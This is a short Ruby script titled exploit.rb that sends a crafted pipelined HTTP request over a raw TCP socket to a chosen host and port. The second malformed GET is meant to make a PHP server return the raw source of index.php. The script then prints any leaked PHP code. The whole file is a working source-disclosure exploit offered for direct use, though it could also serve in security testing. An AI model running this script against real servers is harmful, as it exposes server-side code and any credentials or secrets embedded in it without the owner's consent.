require "net/http"
require "uri"
require "socket"

if ARGV.length != 2
  puts "We need exactly two arguments: exploit.rb url port"
  exit
end

host = ARGV[0]
port = ARGV[1].to_i

# Open a TCP connection to the server
socket = TCPSocket.new(host, port)

# Send the HTTP request over the socket
socket.write("GET /index.php HTTP/1.1\r\n")
socket.write("Host: localhost:8888\r\n")
socket.write("\r\n")
socket.write("GET /xyz.xyz HTTP/1.1\r\n")
socket.write("\r\n")
socket.write("\r\n")

# Read the response from the socket
response = socket.read

# Close the socket
socket.close

if response.include? "<?php"
  puts "[!] Detected source code disclosure in php"
  puts "response content:"
  puts response
end